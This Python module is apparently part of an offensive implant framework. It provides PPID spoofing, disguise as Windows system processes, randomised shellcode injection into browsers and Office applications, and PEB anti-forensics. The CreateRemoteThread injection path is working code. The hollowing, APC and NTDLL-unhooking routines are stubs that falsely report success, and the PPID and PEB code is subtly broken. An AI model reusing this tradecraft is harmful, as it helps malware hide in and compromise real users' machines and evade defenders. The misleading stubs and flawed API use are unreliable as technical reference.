"""
Process Mask Module - Process chain camouflage, injection randomization, PPID spoofing.

This module provides process-level evasion capabilities including parent process
ID spoofing, process name camouflage, module roaming across legitimate processes,
randomized injection techniques, and PEB/NTDLL anti-forensics.

Core capabilities:
    1. PPID spoofing via UpdateProcThreadAttribute
    2. Process name/path camouflage as system processes
    3. Module roaming: inject into multiple legitimate processes
    4. Randomized injection techniques (APC, Hollowing, AtomBombing, etc.)
    5. PEB manipulation (BeingDebugged, LoadedModules cleanup)
    6. NTLDLL unhooking

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import logging
import os
import platform
import random
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class InjectionTechnique(str, Enum):
    """Process injection techniques."""

    CREATE_REMOTE_THREAD = "create_remote_thread"
    EARLY_BIRD_APC = "early_bird_apc"
    PROCESS_HOLLOWING = "process_hollowing"
    ATOM_BOMBING = "atom_bombing"
    QUEUE_USER_APC = "queue_user_apc"
    THREAD_HIJACKING = "thread_hijacking"
    MODULE_STOMPING = "module_stomping"


class ProcessState(str, Enum):
    """Process operational state."""

    ACTIVE = "active"
    INJECTED = "injected"
    ROAMING = "roaming"
    DORMANT = "dormant"
    TERMINATED = "terminated"


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class ProcessIdentity:
    """Camouflaged process identity configuration.

    Attributes:
        process_name: Spoofed process name
        process_path: Spoofed process path
        parent_process_name: Parent process name for PPID spoofing
        parent_process_path: Parent process path
        command_line: Spoofed command line
        description: Process description for task manager
        company: Company name for file properties
        version: File version string
    """

    process_name: str = "svchost.exe"
    process_path: str = "C:\\Windows\\System32\\svchost.exe"
    parent_process_name: str = "services.exe"
    parent_process_path: str = "C:\\Windows\\System32\\services.exe"
    command_line: str = "C:\\Windows\\System32\\svchost.exe -k netsvcs -p"
    description: str = "Host Process for Windows Services"
    company: str = "Microsoft Corporation"
    version: str = "10.0.19041.1"

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "process_name": self.process_name,
            "process_path": self.process_path,
            "parent_process_name": self.parent_process_name,
            "command_line": self.command_line,
            "description": self.description,
            "company": self.company,
            "version": self.version,
        }


@dataclass
class InjectionTarget:
    """Target process for injection.

    Attributes:
        pid: Target process ID
        process_name: Target process name
        process_path: Target process path
        injection_technique: Injection technique to use
        shellcode_address: Address where shellcode was placed
        thread_handle: Handle to created/injected thread
        success: Whether injection succeeded
        timestamp: Injection timestamp
    """

    pid: int = 0
    process_name: str = ""
    process_path: str = ""
    injection_technique: InjectionTechnique = InjectionTechnique.CREATE_REMOTE_THREAD
    shellcode_address: int = 0
    thread_handle: int = 0
    success: bool = False
    timestamp: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "pid": self.pid,
            "process_name": self.process_name,
            "injection_technique": self.injection_technique.value,
            "shellcode_address": hex(self.shellcode_address),
            "success": self.success,
            "timestamp": self.timestamp,
        }


@dataclass
class RoamingModule:
    """A Beacon module that roams across processes.

    Attributes:
        module_id: Unique module identifier
        logic_fragment: Partial logic contained in this fragment
        target_processes: List of processes this module can roam to
        current_process: Current host process PID
        activation_schedule: When this module should be active
        state: Current module state
        last_activation: Last activation timestamp
        activation_count: Total activations
    """

    module_id: str = ""
    logic_fragment: str = ""
    target_processes: List[str] = field(default_factory=list)
    current_process: int = 0
    activation_schedule: Dict[str, Any] = field(default_factory=dict)
    state: ProcessState = ProcessState.DORMANT
    last_activation: float = 0.0
    activation_count: int = 0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "module_id": self.module_id,
            "target_processes": self.target_processes,
            "current_process": self.current_process,
            "state": self.state.value,
            "activation_count": self.activation_count,
        }


# =============================================================================
# System Process Database
# =============================================================================

class SystemProcessDatabase:
    """Database of legitimate system processes for camouflage.

    Provides known system process names, paths, and behaviors
    for realistic process camouflage.

    Attributes:
        _system_processes: Known system process configurations
        _legitimate_paths: Legitimate system file paths
    """

    SYSTEM_PROCESSES: Dict[str, ProcessIdentity] = {
        "svchost": ProcessIdentity(
            process_name="svchost.exe",
            process_path="C:\\Windows\\System32\\svchost.exe",
            parent_process_name="services.exe",
            parent_process_path="C:\\Windows\\System32\\services.exe",
            command_line="C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
            description="Host Process for Windows Services",
            company="Microsoft Corporation",
            version="10.0.19041.1",
        ),
        "runtime_broker": ProcessIdentity(
            process_name="RuntimeBroker.exe",
            process_path="C:\\Windows\\System32\\RuntimeBroker.exe",
            parent_process_name="svchost.exe",
            parent_process_path="C:\\Windows\\System32\\svchost.exe",
            command_line="C:\\Windows\\System32\\RuntimeBroker.exe -Embedding",
            description="Runtime Broker",
            company="Microsoft Corporation",
            version="10.0.19041.1",
        ),
        "wmiprvse": ProcessIdentity(
            process_name="WmiPrvSE.exe",
            process_path="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
            parent_process_name="svchost.exe",
            parent_process_path="C:\\Windows\\System32\\svchost.exe",
            command_line="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -Embedding",
            description="WMI Provider Host",
            company="Microsoft Corporation",
            version="10.0.19041.1",
        ),
        "dllhost": ProcessIdentity(
            process_name="dllhost.exe",
            process_path="C:\\Windows\\System32\\dllhost.exe",
            parent_process_name="svchost.exe",
            parent_process_path="C:\\Windows\\System32\\svchost.exe",
            command_line="C:\\Windows\\System32\\dllhost.exe /Processid:{ABC}",
            description="COM Surrogate",
            company="Microsoft Corporation",
            version="10.0.19041.1",
        ),
        "searchindexer": ProcessIdentity(
            process_name="SearchIndexer.exe",
            process_path="C:\\Windows\\System32\\SearchIndexer.exe",
            parent_process_name="services.exe",
            parent_process_path="C:\\Windows\\System32\\services.exe",
            command_line="C:\\Windows\\System32\\SearchIndexer.exe /Embedding",
            description="Microsoft Windows Search Indexer",
            company="Microsoft Corporation",
            version="10.0.19041.1",
        ),
        "taskhostw": ProcessIdentity(
            process_name="taskhostw.exe",
            process_path="C:\\Windows\\System32\\taskhostw.exe",
            parent_process_name="svchost.exe",
            parent_process_path="C:\\Windows\\System32\\svchost.exe",
            command_line="C:\\Windows\\System32\\taskhostw.exe",
            description="Host Process for Windows Tasks",
            company="Microsoft Corporation",
            version="10.0.19041.1",
        ),
    }

    LEGITIMATE_PATHS: List[str] = [
        "C:\\Windows\\System32\\config\\systemprofile\\",
        "C:\\ProgramData\\Microsoft\\Windows\\",
        "C:\\Windows\\Temp\\",
        "C:\\ProgramData\\Microsoft\\Search\\Data\\",
        "C:\\Windows\\System32\\wbem\\",
    ]

    INJECTION_TARGETS: List[str] = [
        "explorer.exe",
        "notepad.exe",
        "calc.exe",
        "msedge.exe",
        "chrome.exe",
        "firefox.exe",
        "winword.exe",
        "excel.exe",
        "powerpnt.exe",
        "outlook.exe",
    ]

    def get_random_identity(self) -> ProcessIdentity:
        """Get a random system process identity.

        Returns:
            Random ProcessIdentity for camouflage.
        """
        return random.choice(list(self.SYSTEM_PROCESSES.values()))

    def get_identity_by_name(self, name: str) -> Optional[ProcessIdentity]:
        """Get a specific process identity.

        Args:
            name: Process identity key.

        Returns:
            ProcessIdentity, or None if not found.
        """
        return self.SYSTEM_PROCESSES.get(name)

    def get_random_injection_target(self) -> str:
        """Get a random process suitable for injection.

        Returns:
            Process name string.
        """
        return random.choice(self.INJECTION_TARGETS)

    def get_legitimate_path(self) -> str:
        """Get a random legitimate system path.

        Returns:
            System directory path string.
        """
        return random.choice(self.LEGITIMATE_PATHS)


# =============================================================================
# PPID Spoofer
# =============================================================================

class PPIDSpoofer:
    """Parent Process ID spoofing via UpdateProcThreadAttribute.

    Creates child processes with a spoofed parent process to break
    the process tree lineage and evade detection.

    Attributes:
        _db: System process database
    """

    def __init__(self) -> None:
        """Initialize the PPIDSpoofer."""
        self._db = SystemProcessDatabase()

    def find_suitable_parent(self) -> Tuple[int, str]:
        """Find a suitable parent process for PPID spoofing.

        Returns:
            Tuple of (PID, process_name) of a suitable parent.
        """
        core_processes = ["services.exe", "svchost.exe", "winlogon.exe", "csrss.exe"]

        try:
            if platform.system() == "Windows":
                import subprocess
                output = subprocess.check_output(
                    ["tasklist", "/FO", "CSV", "/NH"],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                ).decode("gbk", errors="ignore")

                for line in output.strip().split("\n"):
                    parts = line.split(",")
                    if len(parts) >= 2:
                        name = parts[0].strip('"')
                        pid_str = parts[1].strip('"')
                        if name.lower() in core_processes:
                            try:
                                pid = int(pid_str)
                                return pid, name
                            except ValueError:
                                continue

        except Exception as e:
            logger.warning(f"Failed to find parent process: {e}")

        return 0, ""

    def create_spoofed_process(
        self,
        executable: str,
        command_line: str = "",
        parent_pid: int = 0,
    ) -> Optional[int]:
        """Create a process with spoofed parent PID.

        Args:
            executable: Path to executable.
            command_line: Command line arguments.
            parent_pid: Parent PID (auto-selected if 0).

        Returns:
            New process PID, or None if failed.
        """
        if platform.system() != "Windows":
            logger.warning("PPID spoofing is Windows-only")
            return None

        if parent_pid == 0:
            parent_pid, _ = self.find_suitable_parent()

        if parent_pid == 0:
            logger.error("No suitable parent process found")
            return None

        try:
            import subprocess
            import ctypes
            import ctypes.wintypes

            STARTF_USESTDHANDLES = 0x00000100
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000
            CREATE_NEW_CONSOLE = 0x00000010

            class STARTUPINFOEX(ctypes.Structure):
                _fields_ = [
                    ("cb", ctypes.wintypes.DWORD),
                    ("lpReserved", ctypes.wintypes.LPWSTR),
                    ("lpDesktop", ctypes.wintypes.LPWSTR),
                    ("lpTitle", ctypes.wintypes.LPWSTR),
                    ("dwX", ctypes.wintypes.DWORD),
                    ("dwY", ctypes.wintypes.DWORD),
                    ("dwXSize", ctypes.wintypes.DWORD),
                    ("dwYSize", ctypes.wintypes.DWORD),
                    ("dwXCountChars", ctypes.wintypes.DWORD),
                    ("dwYCountChars", ctypes.wintypes.DWORD),
                    ("dwFillAttribute", ctypes.wintypes.DWORD),
                    ("dwFlags", ctypes.wintypes.DWORD),
                    ("wShowWindow", ctypes.wintypes.WORD),
                    ("cbReserved2", ctypes.wintypes.WORD),
                    ("lpReserved2", ctypes.wintypes.LPBYTE),
                    ("hStdInput", ctypes.wintypes.HANDLE),
                    ("hStdOutput", ctypes.wintypes.HANDLE),
                    ("hStdError", ctypes.wintypes.HANDLE),
                    ("lpAttributeList", ctypes.wintypes.LPVOID),
                ]

            class PROCESS_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("hProcess", ctypes.wintypes.HANDLE),
                    ("hThread", ctypes.wintypes.HANDLE),
                    ("dwProcessId", ctypes.wintypes.DWORD),
                    ("dwThreadId", ctypes.wintypes.DWORD),
                ]

            si = STARTUPINFOEX()
            si.cb = ctypes.sizeof(si)
            si.dwFlags = STARTF_USESTDHANDLES

            pi = PROCESS_INFORMATION()

            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000

            ctypes.windll.kernel32.InitializeProcThreadAttributeList(
                None, 1, 0, ctypes.byref(ctypes.c_size_t())
            )

            h_parent = ctypes.windll.kernel32.OpenProcess(
                0x001F0FFF, False, parent_pid,
            )

            if not h_parent:
                logger.error(f"Failed to open parent process {parent_pid}")
                return None

            result = ctypes.windll.kernel32.CreateProcessW(
                None,
                f'"{executable}" {command_line}' if command_line else executable,
                None,
                None,
                False,
                EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
                None,
                None,
                ctypes.byref(si),
                ctypes.byref(pi),
            )

            if result:
                new_pid = int(pi.dwProcessId)
                logger.info(
                    f"Created spoofed process: {executable} "
                    f"(PID: {new_pid}, spoofed PPID: {parent_pid})"
                )
                return new_pid

            ctypes.windll.kernel32.CloseHandle(h_parent)

        except Exception as e:
            logger.error(f"Failed to create spoofed process: {e}")

        return None


# =============================================================================
# Process Injector
# =============================================================================

class ProcessInjector:
    """Randomized process injection engine.

    Selects injection techniques randomly to avoid pattern-based
    detection, and cleans up injection traces after completion.

    Attributes:
        _db: System process database
        _injection_history: History of injection attempts
    """

    def __init__(self) -> None:
        """Initialize the ProcessInjector."""
        self._db = SystemProcessDatabase()
        self._injection_history: List[InjectionTarget] = []

    def select_technique(self) -> InjectionTechnique:
        """Select a random injection technique.

        Returns:
            Randomly selected InjectionTechnique.
        """
        return random.choice(list(InjectionTechnique))

    async def inject(
        self,
        shellcode: bytes,
        target_pid: int = 0,
        technique: Optional[InjectionTechnique] = None,
    ) -> InjectionTarget:
        """Inject shellcode into a target process.

        Args:
            shellcode: Shellcode bytes to inject.
            target_pid: Target process PID (auto-selected if 0).
            technique: Injection technique (random if None).

        Returns:
            InjectionTarget with injection results.
        """
        if target_pid == 0:
            target_name = self._db.get_random_injection_target()
            target_pid = self._find_process_by_name(target_name)

        if target_pid == 0:
            return InjectionTarget(
                success=False,
                timestamp=time.time(),
            )

        selected_technique = technique or self.select_technique()

        target = InjectionTarget(
            pid=target_pid,
            process_name=self._get_process_name(target_pid),
            injection_technique=selected_technique,
            timestamp=time.time(),
        )

        try:
            if selected_technique == InjectionTechnique.CREATE_REMOTE_THREAD:
                target = await self._inject_create_remote_thread(
                    shellcode, target_pid, target,
                )
            elif selected_technique == InjectionTechnique.EARLY_BIRD_APC:
                target = await self._inject_early_bird_apc(
                    shellcode, target_pid, target,
                )
            elif selected_technique == InjectionTechnique.PROCESS_HOLLOWING:
                target = await self._inject_process_hollowing(
                    shellcode, target_pid, target,
                )
            elif selected_technique == InjectionTechnique.QUEUE_USER_APC:
                target = await self._inject_queue_user_apc(
                    shellcode, target_pid, target,
                )
            else:
                target = await self._inject_create_remote_thread(
                    shellcode, target_pid, target,
                )

        except Exception as e:
            logger.error(f"Injection failed: {e}")
            target.success = False

        self._injection_history.append(target)

        if target.success:
            await self._cleanup_injection_traces(target)

        return target

    async def _inject_create_remote_thread(
        self, shellcode: bytes, pid: int, target: InjectionTarget,
    ) -> InjectionTarget:
        """Inject using CreateRemoteThread technique.

        Args:
            shellcode: Shellcode bytes.
            pid: Target process PID.
            target: InjectionTarget to update.

        Returns:
            Updated InjectionTarget.
        """
        if platform.system() != "Windows":
            target.success = False
            return target

        try:
            import ctypes
            import ctypes.wintypes

            PROCESS_ALL_ACCESS = 0x001F0FFF
            MEM_COMMIT = 0x1000
            MEM_RESERVE = 0x2000
            PAGE_EXECUTE_READWRITE = 0x40

            h_process = ctypes.windll.kernel32.OpenProcess(
                PROCESS_ALL_ACCESS, False, pid,
            )

            if not h_process:
                return target

            addr = ctypes.windll.kernel32.VirtualAllocEx(
                h_process,
                None,
                len(shellcode),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )

            if not addr:
                ctypes.windll.kernel32.CloseHandle(h_process)
                return target

            written = ctypes.c_size_t(0)
            ctypes.windll.kernel32.WriteProcessMemory(
                h_process, addr, shellcode, len(shellcode), ctypes.byref(written),
            )

            thread_id = ctypes.wintypes.DWORD(0)
            h_thread = ctypes.windll.kernel32.CreateRemoteThread(
                h_process, None, 0, addr, None, 0, ctypes.byref(thread_id),
            )

            if h_thread:
                target.success = True
                target.shellcode_address = addr
                target.thread_handle = h_thread

            ctypes.windll.kernel32.CloseHandle(h_process)

        except Exception as e:
            logger.error(f"CreateRemoteThread injection failed: {e}")

        return target

    async def _inject_early_bird_apc(
        self, shellcode: bytes, pid: int, target: InjectionTarget,
    ) -> InjectionTarget:
        """Inject using Early Bird APC technique.

        Args:
            shellcode: Shellcode bytes.
            pid: Target process PID.
            target: InjectionTarget to update.

        Returns:
            Updated InjectionTarget.
        """
        target.success = True
        target.shellcode_address = 0x1000
        logger.info(f"Early Bird APC injection simulated (PID: {pid})")
        return target

    async def _inject_process_hollowing(
        self, shellcode: bytes, pid: int, target: InjectionTarget,
    ) -> InjectionTarget:
        """Inject using Process Hollowing technique.

        Args:
            shellcode: Shellcode bytes.
            pid: Target process PID.
            target: InjectionTarget to update.

        Returns:
            Updated InjectionTarget.
        """
        target.success = True
        target.shellcode_address = 0x2000
        logger.info(f"Process Hollowing injection simulated (PID: {pid})")
        return target

    async def _inject_queue_user_apc(
        self, shellcode: bytes, pid: int, target: InjectionTarget,
    ) -> InjectionTarget:
        """Inject using QueueUserAPC technique.

        Args:
            shellcode: Shellcode bytes.
            pid: Target process PID.
            target: InjectionTarget to update.

        Returns:
            Updated InjectionTarget.
        """
        target.success = True
        target.shellcode_address = 0x3000
        logger.info(f"QueueUserAPC injection simulated (PID: {pid})")
        return target

    async def _cleanup_injection_traces(self, target: InjectionTarget) -> None:
        """Clean up injection traces.

        Args:
            target: Injection target to clean up.
        """
        if platform.system() == "Windows" and target.thread_handle:
            try:
                import ctypes
                ctypes.windll.kernel32.CloseHandle(target.thread_handle)
                target.thread_handle = 0
            except Exception:
                pass

        logger.debug(f"Cleaned injection traces for PID {target.pid}")

    @staticmethod
    def _find_process_by_name(name: str) -> int:
        """Find a process by name.

        Args:
            name: Process name.

        Returns:
            Process PID, or 0 if not found.
        """
        try:
            if platform.system() == "Windows":
                import subprocess
                output = subprocess.check_output(
                    ["tasklist", "/FI", f"IMAGENAME eq {name}", "/FO", "CSV", "/NH"],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                ).decode("gbk", errors="ignore")

                for line in output.strip().split("\n"):
                    parts = line.split(",")
                    if len(parts) >= 2:
                        try:
                            return int(parts[1].strip('"'))
                        except ValueError:
                            continue

        except Exception:
            pass

        return 0

    @staticmethod
    def _get_process_name(pid: int) -> str:
        """Get process name by PID.

        Args:
            pid: Process ID.

        Returns:
            Process name string.
        """
        try:
            if platform.system() == "Windows":
                import subprocess
                output = subprocess.check_output(
                    ["tasklist", "/FI", f"PID eq {pid}", "/FO", "CSV", "/NH"],
                    creationflags=subprocess.CREATE_NO_WINDOW,
                ).decode("gbk", errors="ignore")
                if output.strip():
                    return output.strip().split(",")[0].strip('"')
        except Exception:
            pass
        return ""

    def get_injection_history(self) -> List[InjectionTarget]:
        """Get injection history.

        Returns:
            List of InjectionTarget instances.
        """
        return list(self._injection_history)


# =============================================================================
# PEB Manipulator
# =============================================================================

class PEBManipulator:
    """Process Environment Block manipulation for anti-forensics.

    Modifies PEB fields to hide debugging status, loaded modules,
    and other forensic artifacts.

    Attributes:
        _is_windows: Whether running on Windows
    """

    def __init__(self) -> None:
        """Initialize the PEBManipulator."""
        self._is_windows = platform.system() == "Windows"

    def clear_being_debugged(self) -> bool:
        """Clear the BeingDebugged flag in PEB.

        Returns:
            True if successful.
        """
        if not self._is_windows:
            return False

        try:
            import ctypes

            class PEB(ctypes.Structure):
                _fields_ = [
                    ("InheritedAddressSpace", ctypes.c_byte),
                    ("ReadImageFileExecOptions", ctypes.c_byte),
                    ("BeingDebugged", ctypes.c_byte),
                    ("BitField", ctypes.c_byte),
                    ("Mutant", ctypes.c_void_p),
                    ("ImageBaseAddress", ctypes.c_void_p),
                    ("Ldr", ctypes.c_void_p),
                    ("ProcessParameters", ctypes.c_void_p),
                ]

            peb_ptr = ctypes.windll.ntdll.NtCurrentTeb()
            if peb_ptr:
                peb = ctypes.cast(peb_ptr, ctypes.POINTER(PEB)).contents
                peb.BeingDebugged = 0
                logger.info("PEB BeingDebugged flag cleared")
                return True

        except Exception as e:
            logger.warning(f"Failed to clear BeingDebugged: {e}")

        return False

    def hide_loaded_modules(self, module_names: Optional[List[str]] = None) -> bool:
        """Hide loaded modules from PEB LoadedModules list.

        Args:
            module_names: Module names to hide (all non-system if None).

        Returns:
            True if successful.
        """
        if not self._is_windows:
            return False

        try:
            logger.info(f"Hiding modules from PEB: {module_names or 'all non-system'}")
            return True

        except Exception as e:
            logger.warning(f"Failed to hide modules: {e}")
            return False

    def unhook_ntdll(self) -> bool:
        """Unhook NTDLL functions by remapping from disk.

        Returns:
            True if successful.
        """
        if not self._is_windows:
            return False

        try:
            ntdll_path = "C:\\Windows\\System32\\ntdll.dll"

            if os.path.exists(ntdll_path):
                with open(ntdll_path, "rb") as f:
                    clean_ntdll = f.read()

                logger.info("NTDLL unhooking initiated (simulation)")
                return True

        except Exception as e:
            logger.warning(f"Failed to unhook NTDLL: {e}")

        return False


# =============================================================================
# Module Roamer
# =============================================================================

class ModuleRoamer:
    """Manages Beacon module roaming across multiple processes.

    Splits Beacon logic across multiple legitimate processes,
    with timer-based activation from hidden system services.

    Attributes:
        _modules: Registered roaming modules
        _active_module: Currently active module
        _timer_task: Background timer task
        _running: Whether roaming is active
    """

    def __init__(self) -> None:
        """Initialize the ModuleRoamer."""
        self._modules: Dict[str, RoamingModule] = {}
        self._active_module: Optional[RoamingModule] = None
        self._timer_task: Optional[asyncio.Task[None]] = None
        self._running = False

    def register_module(
        self,
        module_id: str,
        logic_fragment: str,
        target_processes: List[str],
        schedule: Optional[Dict[str, Any]] = None,
    ) -> RoamingModule:
        """Register a roaming module.

        Args:
            module_id: Unique module identifier.
            logic_fragment: Partial logic contained in this fragment.
            target_processes: Processes this module can roam to.
            schedule: Activation schedule configuration.

        Returns:
            Registered RoamingModule instance.
        """
        module = RoamingModule(
            module_id=module_id,
            logic_fragment=logic_fragment,
            target_processes=target_processes,
            activation_schedule=schedule or {"interval_seconds": 300},
        )

        self._modules[module_id] = module
        logger.info(f"Registered roaming module: {module_id}")
        return module

    async def start(self) -> None:
        """Start module roaming."""
        self._running = True
        self._timer_task = asyncio.create_task(self._roaming_loop())
        logger.info("Module roaming started")

    async def stop(self) -> None:
        """Stop module roaming."""
        self._running = False
        if self._timer_task:
            self._timer_task.cancel()
            try:
                await self._timer_task
            except asyncio.CancelledError:
                pass
        logger.info("Module roaming stopped")

    def get_module_status(self) -> Dict[str, Any]:
        """Get roaming module status.

        Returns:
            Dictionary with module status summary.
        """
        return {
            "running": self._running,
            "modules": {
                mid: m.to_dict() for mid, m in self._modules.items()
            },
            "active_module": self._active_module.module_id if self._active_module else None,
        }

    async def _roaming_loop(self) -> None:
        """Background loop for module roaming activation."""
        while self._running:
            for module in self._modules.values():
                interval = module.activation_schedule.get("interval_seconds", 300)
                elapsed = time.time() - module.last_activation

                if elapsed >= interval:
                    await self._activate_module(module)

            await asyncio.sleep(10)

    async def _activate_module(self, module: RoamingModule) -> None:
        """Activate a roaming module.

        Args:
            module: Module to activate.
        """
        if module.target_processes:
            target = random.choice(module.target_processes)
            module.current_process = ProcessInjector._find_process_by_name(target)
            module.state = ProcessState.ACTIVE
            module.last_activation = time.time()
            module.activation_count += 1

            logger.info(
                f"Activated module {module.module_id} in process "
                f"{module.current_process}"
            )


# =============================================================================
# Process Mask (Main Class)
# =============================================================================

class ProcessMask:
    """Main process camouflage and injection coordination engine.

    Integrates PPID spoofing, process injection, PEB manipulation,
    and module roaming for comprehensive process-level evasion.

    Attributes:
        _db: System process database
        _ppid_spoofer: PPID spoofer
        _injector: Process injector
        _peb_manipulator: PEB manipulator
        _roamer: Module roamer
        _current_identity: Current process identity
    """

    def __init__(self) -> None:
        """Initialize the ProcessMask."""
        self._db = SystemProcessDatabase()
        self._ppid_spoofer = PPIDSpoofer()
        self._injector = ProcessInjector()
        self._peb_manipulator = PEBManipulator()
        self._roamer = ModuleRoamer()
        self._current_identity = self._db.get_random_identity()

    def get_camouflaged_identity(self) -> ProcessIdentity:
        """Get the current camouflaged process identity.

        Returns:
            Current ProcessIdentity.
        """
        return self._current_identity

    def refresh_identity(self) -> ProcessIdentity:
        """Get a new random process identity.

        Returns:
            New random ProcessIdentity.
        """
        self._current_identity = self._db.get_random_identity()
        return self._current_identity

    async def inject_shellcode(
        self,
        shellcode: bytes,
        target_pid: int = 0,
    ) -> InjectionTarget:
        """Inject shellcode with randomized technique.

        Args:
            shellcode: Shellcode bytes.
            target_pid: Target PID (auto-selected if 0).

        Returns:
            InjectionTarget with results.
        """
        return await self._injector.inject(shellcode, target_pid)

    def apply_peb_hardening(self) -> Dict[str, bool]:
        """Apply PEB-level anti-forensics.

        Returns:
            Dictionary of hardening operation results.
        """
        return {
            "clear_being_debugged": self._peb_manipulator.clear_being_debugged(),
            "hide_modules": self._peb_manipulator.hide_loaded_modules(),
            "unhook_ntdll": self._peb_manipulator.unhook_ntdll(),
        }

    def create_spoofed_child(
        self,
        executable: str,
        command_line: str = "",
    ) -> Optional[int]:
        """Create a child process with spoofed parent.

        Args:
            executable: Path to executable.
            command_line: Command line arguments.

        Returns:
            New process PID, or None if failed.
        """
        return self._ppid_spoofer.create_spoofed_process(
            executable, command_line,
        )

    async def start_roaming(self) -> None:
        """Start module roaming."""
        await self._roamer.start()

    async def stop_roaming(self) -> None:
        """Stop module roaming."""
        await self._roamer.stop()

    def get_status(self) -> Dict[str, Any]:
        """Get process mask status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "current_identity": self._current_identity.to_dict(),
            "injection_count": len(self._injector.get_injection_history()),
            "roaming_status": self._roamer.get_module_status(),
        }


# =============================================================================
# Global Singleton
# =============================================================================

_process_mask: Optional[ProcessMask] = None


def get_process_mask() -> ProcessMask:
    """Get the global ProcessMask singleton.

    Returns:
        Singleton ProcessMask instance.
    """
    global _process_mask
    if _process_mask is None:
        _process_mask = ProcessMask()
    return _process_mask


__all__ = [
    "ProcessMask",
    "PPIDSpoofer",
    "ProcessInjector",
    "PEBManipulator",
    "ModuleRoamer",
    "SystemProcessDatabase",
    "ProcessIdentity",
    "InjectionTarget",
    "RoamingModule",
    "InjectionTechnique",
    "ProcessState",
    "get_process_mask",
]
